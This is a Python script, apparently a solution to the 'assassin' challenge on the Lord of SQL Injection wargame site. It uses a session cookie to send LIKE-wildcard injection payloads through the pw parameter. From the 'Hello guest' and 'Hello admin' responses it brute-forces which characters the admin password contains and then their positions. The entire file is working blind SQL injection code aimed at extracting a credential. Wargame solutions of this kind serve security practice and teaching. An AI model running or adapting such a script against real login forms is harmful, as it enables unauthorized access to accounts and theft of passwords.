import requests

url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?"
cookies = {'PHPSESSID' : 'd390gv8lirld82i5opc2qapa7u'}
pw = ""
keyword = []
print("------- FINDING KEYWORD -------")

for i in range(48,128) :
    try :
        c = chr(i)
        query = f"{url}pw=%{c}%"
        req = requests.get(query,cookies=cookies)
    except :
        print("Error !")
        continue
    if 'Hello guest' in req.text :
        keyword.append(chr(i))
        print("Found Keyword! ",chr(i))
        continue
    
   # print(req.text)
    print("FINDING PW...",chr(i))
keyword.remove('d')
keyword.remove('e')
keyword.remove('f')
print(keyword)

def setFrontUnder(i) :
    und = ""
    for i in range(0,i) :
        und += '_'
    return und

def setBackUnder(i) :
    und = ""
    for i in range(1,8-i) :
        und +='_'
    return und

print("------- FINDING KEYWORD -------")
pw = ""

for i in range(0,8) :
    bool = 0
    for j in range(0,8) :
        try :
            fu = setFrontUnder(i)
            bu = setBackUnder(i)
            unb = f"{fu}{keyword[j]}{bu}"
            query = f"{url}pw={unb}"
            req = requests.get(query,cookies=cookies)
        except :
            print("Error !")
            continue
        if 'Hello admin' in req.text :
            pw += keyword[j]
            print("Found password! ",pw)
            bool=1
            break
        print(unb)
        print((i+1), "# FINDING PW... ",keyword[j])
    if bool == 0 :
        pw += '_'
print("pw : [",pw,"]")
